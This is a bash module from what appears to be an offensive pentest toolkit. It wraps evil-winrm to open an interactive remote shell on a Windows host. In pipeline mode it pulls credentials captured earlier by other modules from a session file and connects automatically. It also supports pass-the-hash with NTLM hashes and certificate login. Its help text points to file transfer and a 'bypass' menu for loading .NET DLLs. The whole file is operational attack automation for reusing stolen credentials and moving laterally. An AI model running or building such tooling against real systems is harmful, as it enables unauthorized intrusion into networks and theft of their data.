#!/usr/bin/env bash
source "$(dirname "$0")/../lib.sh"
set -uo pipefail

banner "EVIL-WINRM" "WinRM exploitation · interactive shell · file upload/download · PTH"

require_tool evil-winrm "gem install evil-winrm  # or  apt install evil-winrm"

# ── Target ─────────────────────────────────────────────────────────────────────
section "TARGET"

_PASS=""; _HASH=""; _CERT=""; _KEY=""

if [[ -n "${SESSION_DIR:-}" ]]; then
  # Pipeline: use chain_dc.txt or TARGET for host
  _host=""
  [[ -s "${SESSION_DIR}/chain_dc.txt" ]] && _host=$(head -1 "${SESSION_DIR}/chain_dc.txt")
  [[ -z "$_host" ]] && _host="${TARGET%%/*}"
  _port=5985; _auth=1; _user=""; _PASS=""
  # Read creds from chain_creds.txt
  if [[ -s "${SESSION_DIR}/chain_creds.txt" ]]; then
    _cline=$(grep -m1 'login:.*password:' "${SESSION_DIR}/chain_creds.txt" 2>/dev/null || true)
    [[ -n "$_cline" ]] && _user=$(echo "$_cline" | grep -oP 'login:\s*\K\S+' || true)
    [[ -n "$_cline" ]] && _PASS=$(echo "$_cline" | grep -oP 'password:\s*\K\S+' || true)
  fi
  if [[ -z "$_user" || -z "$_PASS" ]]; then
    printf '  %s[CHAIN]%s No credentials in chain_creds.txt — cannot connect WinRM without creds%s\n' \
      "${CYAN}" "${RESET}" "${RESET}"
    exit 0
  fi
  printf '  %s[CHAIN]%s Target: %s:%s  User: %s  (pipeline auto)%s\n\n' \
    "${CYAN}" "${RESET}" "$_host" "$_port" "$_user" "${RESET}"
else
  printf '  %s>>%s Target IP / hostname: ' "${CYAN}" "${RESET}"
  read -r _host; _host="${_host:-}"
  [[ -z "$_host" ]] && { printf '  %s[!]%s No target\n' "${RED}" "${RESET}"; exit 1; }

  printf '  %s>>%s WinRM port [5985]: ' "${CYAN}" "${RESET}"
  read -r _port; _port="${_port:-5985}"

  section "AUTHENTICATION"
  printf '  %s[01]%s Password         %s(cleartext)%s\n'    "${CYAN}" "${RESET}" "${DIM}" "${RESET}"
  printf '  %s[02]%s NTLM hash        %s(pass-the-hash)%s\n' "${CYAN}" "${RESET}" "${DIM}" "${RESET}"
  printf '  %s[03]%s SSL + PEM cert   %s(certificate auth)%s\n' "${CYAN}" "${RESET}" "${DIM}" "${RESET}"
  printf '\n  %s>>%s Auth mode [1]: ' "${CYAN}" "${RESET}"
  read -r _auth; _auth="${_auth:-1}"

  printf '  %s>>%s Username: ' "${CYAN}" "${RESET}"; read -r _user
  [[ -z "$_user" ]] && { printf '  %s[!]%s Username required\n' "${RED}" "${RESET}"; exit 1; }

  case "$_auth" in
    2)
      printf '  %s>>%s NTLM hash (LM:NT or :NT or full NT): ' "${CYAN}" "${RESET}"
      read -r _HASH
      [[ -z "$_HASH" ]] && { printf '  %s[!]%s Hash required\n' "${RED}" "${RESET}"; exit 1; }
      [[ "$_HASH" != *:* ]] && _HASH=":${_HASH}"
      ;;
    3)
      printf '  %s>>%s Certificate PEM path: ' "${CYAN}" "${RESET}"; read -r _CERT
      printf '  %s>>%s Key PEM path: '         "${CYAN}" "${RESET}"; read -r _KEY
      ;;
    *)
      set +H
      printf '  %s>>%s Password: ' "${CYAN}" "${RESET}"; read -r _PASS
      set -H 2>/dev/null || true
      [[ -z "$_PASS" ]] && { printf '  %s[!]%s Password required\n' "${RED}" "${RESET}"; exit 1; }
      ;;
  esac
fi

# ── Options ────────────────────────────────────────────────────────────────────
if [[ -n "${SESSION_DIR:-}" ]]; then
  _ssl="n"; _scripts_path=""; _exec_path=""
  printf '  %s[CHAIN]%s Options: no-SSL, no custom paths  (pipeline auto-select)%s\n\n' \
    "${CYAN}" "${RESET}" "${RESET}"
else
  section "OPTIONS"
  printf '  %s>>%s SSL [y/N]: ' "${CYAN}" "${RESET}"; read -r _ssl
  printf '  %s>>%s Custom scripts path %s(blank = none)%s: ' "${CYAN}" "${RESET}" "${DIM}" "${RESET}"
  read -r _scripts_path
  printf '  %s>>%s Custom executables path %s(blank = none)%s: ' "${CYAN}" "${RESET}" "${DIM}" "${RESET}"
  read -r _exec_path
fi

outdir="$(make_outdir)"
outfile="$outdir/evilwinrm.log"
: > "$outfile"

_cleanup() { mark_done "$outdir"; }
trap '_cleanup' EXIT

printf '\n  %s[SYS]%s Target : %s%s:%s%s\n' "${CYAN}" "${RESET}" "${GREEN}" "$_host" "$_port" "${RESET}"
printf '  %s[SYS]%s User   : %s%s%s\n'      "${CYAN}" "${RESET}" "${CYAN}"  "$_user"           "${RESET}"
printf '  %s[SYS]%s Log    : %s%s%s\n\n'    "${CYAN}" "${RESET}" "${DIM}"   "$outfile"         "${RESET}"

printf '  %s┌──────────────────────────────────────────────────┐%s\n' "${CYAN}" "${RESET}"
printf '  %s│  EVIL-WINRM TIPS                                 │%s\n' "${CYAN}${BOLD}" "${RESET}"
printf '  %s│%s  upload   localfile remotefilename                %s│%s\n' "${CYAN}" "${RESET}" "${DIM}" "${RESET}"
printf '  %s│%s  download remotefile localfilename                %s│%s\n' "${CYAN}" "${RESET}" "${DIM}" "${RESET}"
printf '  %s│%s  menu     — load .NET DLLs / bypass              %s│%s\n' "${CYAN}" "${RESET}" "${DIM}" "${RESET}"
printf '  %s│%s  Ctrl+C / exit   — disconnect cleanly            %s│%s\n' "${CYAN}" "${RESET}" "${DIM}" "${RESET}"
printf '  %s└──────────────────────────────────────────────────┘%s\n' "${CYAN}" "${RESET}"
printf '\n'

section "CONNECTING"

declare -a _args=(
  -i "$_host"
  -P "$_port"
  -u "$_user"
)

case "$_auth" in
  2) _args+=(-H "$_HASH") ;;
  3) _args+=(-c "$_CERT" -k "$_KEY") ;;
  *) _args+=(-p "$_PASS") ;;
esac

[[ "${_ssl,,}" == "y" ]]      && _args+=(-S)
[[ -n "$_scripts_path" ]]      && _args+=(-s "$_scripts_path")
[[ -n "$_exec_path" ]]         && _args+=(-e "$_exec_path")

run_fg evil-winrm "${_args[@]}" 2>&1 | tee -a "$outfile" || true

printf '\n  %s[SYS]%s Log : %s%s%s\n\n' "${CYAN}" "${RESET}" "${DIM}" "$outfile" "${RESET}"
